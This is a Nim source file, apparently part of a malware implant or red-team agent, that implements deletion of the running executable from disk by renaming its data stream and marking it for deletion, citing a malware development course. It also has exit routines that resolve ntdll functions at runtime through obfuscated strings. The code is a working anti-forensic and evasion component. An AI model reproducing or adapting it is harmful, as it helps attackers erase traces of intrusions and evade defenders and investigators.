import winim/lean
import strutils, strformat, random
import ../utils/io
import ../../common/[types, utils]

type 
    RtlExitUserThread = proc(exitStatus: NTSTATUS): VOID {.stdcall.}
    RtlExitUserProcess = proc(exitStatus: NTSTATUS): VOID {.stdcall.}

    FILE_RENAME_INFO2* = object 
        Flags*: DWORD 
        RootDirectory*: HANDLE
        FileNameLength*: DWORD 
        FileName*: array[MAX_PATH, WCHAR]

    FILE_DISPOSITION_INFO_EX* = object 
        Flags*: DWORD

const
    RAND_MAX = 0x7FFF
    FILE_DISPOSITION_FLAG_DELETE = 0x00000001 # https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_file_disposition_information_ex
    FILE_DISPOSITION_POSIX_SEMANTICS = 0x00000002 
    fileDispositionInfoEx* = 21 # https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ne-minwinbase-file_info_by_handle_class

#[
    Delete own executable image from disk.
    - https://maldevacademy.com/modules/72
]#
proc deleteSelfFromDisk*() = 
    let newStream = +$(fmt":{uint(rand(RAND_MAX)):x}{uint(rand(RAND_MAX)):x}")  # Convert to wString
    var 
        szFileName: array[MAX_PATH * 2, WCHAR]
        fileRenameInfo2: FILE_RENAME_INFO2
        fileDisposalInfoEx: FILE_DISPOSITION_INFO_EX
        hLocalImgFile: HANDLE = INVALID_HANDLE_VALUE

    # Initialize fileRenameInfo
    fileRenameInfo2.FileNameLength = cast[DWORD](newStream.len() * sizeof(WCHAR))
    fileRenameInfo2.RootDirectory = 0 
    fileRenameInfo2.Flags = 0 

    for i in 0 ..< newStream.len():
        fileRenameInfo2.FileName[i] = newStream[i]

    # Get full file name of the executable
    if GetModuleFileNameW(0, cast[LPWSTR](addr szFileName[0]), MAX_PATH * 2) == 0: 
        raise newException(CatchableError, GetLastError().getError())
    
    hLocalImgFile = CreateFileW(cast[LPCWSTR](addr szFileName[0]), DELETE or SYNCHRONIZE, FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, 0)
    if hLocalImgFile == INVALID_HANDLE_VALUE:
        raise newException(CatchableError, GetLastError().getError())

    if SetFileInformationByHandle(hLocalImgFile, fileRenameInfo, addr fileRenameInfo2, cast[DWORD](sizeof(FILE_RENAME_INFO2))) == FALSE:
        raise newException(CatchableError, GetLastError().getError())
    
    CloseHandle(hLocalImgFile)

    hLocalImgFile = CreateFileW(cast[LPCWSTR](addr szFileName[0]),  DELETE or SYNCHRONIZE, FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, 0)
    if hLocalImgFile == INVALID_HANDLE_VALUE: 
        raise newException(CatchableError, GetLastError().getError())

    fileDisposalInfoEx.Flags = FILE_DISPOSITION_FLAG_DELETE or FILE_DISPOSITION_POSIX_SEMANTICS

    if SetFileInformationByHandle(hLocalImgFile, fileDispositionInfoEx, addr fileDisposalInfoEx, cast[DWORD](sizeof(FILE_DISPOSITION_INFO_EX))) == FALSE: 
        raise newException(CatchableError, GetLastError().getError())

    CloseHandle(hLocalImgFile)

proc exit*(exitType: ExitType = EXIT_PROCESS, selfDelete: bool = false) =
    let hNtdll = GetModuleHandleA(protect("ntdll"))

    if selfDelete: deleteSelfFromDisk()

    case exitType: 
    of ExitType.EXIT_PROCESS: 
        let pRtlExitUserProcess = cast[RtlExitUserProcess](GetProcAddress(hNtdll, protect("RtlExitUserProcess")))
        pRtlExitUserProcess(STATUS_SUCCESS)
    of ExitType.EXIT_THREAD:
        let pRtlExitUserThread = cast[RtlExitUserThread](GetProcAddress(hNtdll, protect("RtlExitUserThread")))
        pRtlExitUserThread(STATUS_SUCCESS)
    else: discard 


